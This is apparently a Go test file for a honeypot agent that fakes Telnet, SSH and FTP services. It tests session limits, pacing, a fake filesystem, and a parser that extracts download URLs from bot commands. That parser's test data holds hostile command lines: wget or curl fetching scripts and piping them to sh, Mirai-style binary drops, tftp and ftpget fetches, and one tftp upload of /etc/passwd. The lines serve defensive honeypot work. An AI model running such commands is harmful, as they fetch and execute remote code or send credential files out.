package services

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"io"
	"log"
	"net"
	"strings"
	"testing"
	"time"

	"golang.org/x/crypto/ssh"

	"honeypot-agent/internal/shipper"
	"honeypot-agent/internal/vfs"
)

// Every session loop (Telnet, the SSH shell with and without a pty, FTP) ends after maxSessionCommands
// lines (3 here, 1000 for real), and the agent logs it at most once per limitLogEvery.
func TestSessionCommandLimit(t *testing.T) {
	oldMax, oldDelay, oldLog := maxSessionCommands, routerDelay, log.Writer()
	if oldMax != 1000 { // written here, like TestPacer's numbers: decided 23.11
		t.Errorf("maxSessionCommands = %d", oldMax)
	}
	maxSessionCommands, routerDelay = 3, time.Millisecond
	var logged bytes.Buffer
	log.SetOutput(&logged)
	commandLimit.Lock()
	commandLimit.closed, commandLimit.lastLog = 0, time.Time{}
	commandLimit.Unlock()
	t.Cleanup(func() { maxSessionCommands, routerDelay = oldMax, oldDelay; log.SetOutput(oldLog) })

	session := func(handle func(net.Conn), send string) string { // everything the server sent until it hung up
		addr, done := serveOne(t, handle)
		conn, err := net.Dial("tcp", addr)
		if err != nil {
			t.Fatal(err)
		}
		defer conn.Close()
		conn.SetDeadline(time.Now().Add(10 * time.Second))
		fmt.Fprint(conn, send)
		all, _ := io.ReadAll(conn)
		waitDone(t, done)
		return string(all)
	}
	s := shipper.NewShipper(io.Discard, "", "")

	got := session(func(c net.Conn) { handleTelnet(c, "telnet-test", s) }, "root\r\nroot\r\necho 1\r\necho 2\r\necho 3\r\necho 4\r\n")
	if !strings.Contains(got, "\r\n3\r\n") || strings.Contains(got, "\r\n4\r\n") {
		t.Errorf("Telnet: %q", got)
	}
	got = session(func(c net.Conn) { handleFTP(c, "ftp-test", s) }, strings.Repeat("NOOP\r\n", 4))
	if strings.Count(got, "530 Please login with USER and PASS.\r\n") != 3 {
		t.Errorf("FTP: %q", got)
	}
	stdout, _, _, _ := sshRun(t, func(session *ssh.Session, stdin io.WriteCloser) error {
		if err := session.Shell(); err != nil {
			return err
		}
		_, err := fmt.Fprint(stdin, "echo 1\necho 2\necho 3\necho 4\n")
		return err
	})
	if stdout != "1\n2\n3\n" {
		t.Errorf("SSH without a pty: %q", stdout)
	}
	stdout, _, _, _ = sshRun(t, func(session *ssh.Session, stdin io.WriteCloser) error {
		if err := session.RequestPty("vt100", 24, 80, ssh.TerminalModes{}); err != nil {
			return err
		}
		if err := session.Shell(); err != nil {
			return err
		}
		_, err := fmt.Fprint(stdin, "echo 1\recho 2\recho 3\recho 4\r")
		return err
	})
	if !strings.Contains(stdout, "\r\n3\r\n") || strings.Contains(stdout, "\r\n4\r\n") {
		t.Errorf("SSH with a pty: %q", stdout)
	}

	// 4 sessions closed within limitLogEvery: one message (the first), the other 3 counted for the next
	if n := strings.Count(logged.String(), "reached 3 commands - closed"); n != 1 ||
		!strings.Contains(logged.String(), "TELNET: session from 127.0.0.1 reached 3 commands - closed (1 sessions since the last message)") {
		t.Errorf("log: %q", logged.String())
	}
	if commandLimit.closed != 3 {
		t.Errorf("%d sessions counted since the message (expected 3)", commandLimit.closed)
	}
}

// The pacer makes only a command that comes too soon wait. The numbers are written here, not taken
// from routerDelay, so a changed constant fails the test too.
func TestPacer(t *testing.T) {
	const slack = 50 * time.Millisecond // scheduling noise
	var p pacer
	took := func() time.Duration {
		start := time.Now()
		p.wait()
		return time.Since(start)
	}

	if d := took(); d > slack {
		t.Errorf("the first command waited %v (expected no wait)", d)
	}
	if d := took(); d < 200*time.Millisecond || d > 300*time.Millisecond+slack {
		t.Errorf("a command right after the previous one waited %v (expected 200-300ms)", d)
	}
	time.Sleep(400 * time.Millisecond) // whoever waits for the answer before sending the next command...
	if d := took(); d > slack {
		t.Errorf("a command sent 400ms later waited %v (expected no wait)", d) // ...never waits
	}
}

// downloadURL pulls the download URL out of typical bot lines: one with a scheme (stopping at shell
// separators and quotes), else what wget, tftp -g or ftpget would fetch without one.
func TestDownloadURL(t *testing.T) {
	tests := []struct {
		line string
		want string
	}{
		{"wget http://203.0.113.7/bins/mirai.arm7", "http://203.0.113.7/bins/mirai.arm7"},
		{"cd /tmp; wget http://203.0.113.7/x.sh; sh x.sh", "http://203.0.113.7/x.sh"},
		{"curl -s https://example.com/a.sh|sh", "https://example.com/a.sh"},
		{"busybox wget 'http://example.com/b'&&chmod +x b", "http://example.com/b"},
		{`curl "http://example.com/c"`, "http://example.com/c"},
		{"ftpget -v -u anonymous ftp://example.com/x", "ftp://example.com/x"},
		{"busybox tftp tftp://203.0.113.7/bot", "tftp://203.0.113.7/bot"},
		{"cat /proc/cpuinfo", ""},

		// without a scheme: BusyBox's wget takes it as http://
		{"cd /tmp; wget 203.0.113.7/bins.sh; chmod 777 bins.sh", "http://203.0.113.7/bins.sh"},
		{"wget -O /tmp/x -q 203.0.113.7:8080/y", "http://203.0.113.7:8080/y"},
		{"/bin/busybox wget -qO- 'example.com/i.sh'|sh", "http://example.com/i.sh"},
		{"nohup wget --user-agent Mozilla --tries=3 example.com/z &", "http://example.com/z"},
		{"wget -U x -T 5 -t 2 -P /tmp -Y off example.com/a", "http://example.com/a"},
		{"wget $IP/bins.sh", ""}, // only known when it runs
		{"wget -q", ""},
		{"wget HTTPS://example.com/a", ""}, // a scheme BusyBox refuses: nothing would be fetched
		{"cd /tmp || cd /var/run; busybox tftp -g -r mips 203.0.113.7; chmod +x mips", "tftp://203.0.113.7/mips"},
		{"tftp -l bot -r bins/arm7 -g 203.0.113.7 6969", "tftp://203.0.113.7:6969/bins/arm7"},
		{"tftp -g -l bot 203.0.113.7", "tftp://203.0.113.7/bot"},
		{"tftp -p -l /etc/passwd 203.0.113.7", ""}, // -p sends a file
		{"ftpget -v -u anonymous -p anonymous -P 2121 203.0.113.7 bins.sh bins/arm7", "ftp://203.0.113.7:2121/bins/arm7"},
		{"ftpget 203.0.113.7 x.sh", "ftp://203.0.113.7/x.sh"},
		{"ftpget 203.0.113.7", ""},
		{"echo wget; uname -a", ""},
	}
	for _, tt := range tests {
		if got := downloadURL(tt.line); got != tt.want {
			t.Errorf("%q: got %q, want %q", tt.line, got, tt.want)
		}
	}
}

// newSessionID: 16 hex characters, a different one every time.
func TestNewSessionID(t *testing.T) {
	seen := map[string]bool{}
	for i := 0; i < 1000; i++ {
		id := newSessionID()
		if _, err := hex.DecodeString(id); err != nil || len(id) != 16 {
			t.Fatalf("bad session id: %q", id)
		}
		if seen[id] {
			t.Fatalf("session id %q came out twice", id)
		}
		seen[id] = true
	}
}

// Persona rule: every user that can log in must be in the fake /etc/passwd with uid 0 and in
// /etc/shadow. Otherwise `cat /etc/passwd` right after a successful login gives us away.
func TestLoginUsersExistInFakeSystem(t *testing.T) {
	passwd, _, _ := vfs.NewShell().Run("cat /etc/passwd")
	shadow, _, _ := vfs.NewShell().Run("cat /etc/shadow")

	for credential := range weakCredentials {
		user, _, _ := strings.Cut(credential, ":")
		// "\n" in front so "root" can't match the end of another name, and the first line counts too
		if !strings.Contains("\n"+passwd, "\n"+user+":x:0:0:") {
			t.Errorf("user %q is missing from the fake /etc/passwd (or doesn't have uid 0)", user)
		}
		if !strings.Contains("\n"+shadow, "\n"+user+":") {
			t.Errorf("user %q is missing from the fake /etc/shadow", user)
		}
	}
}
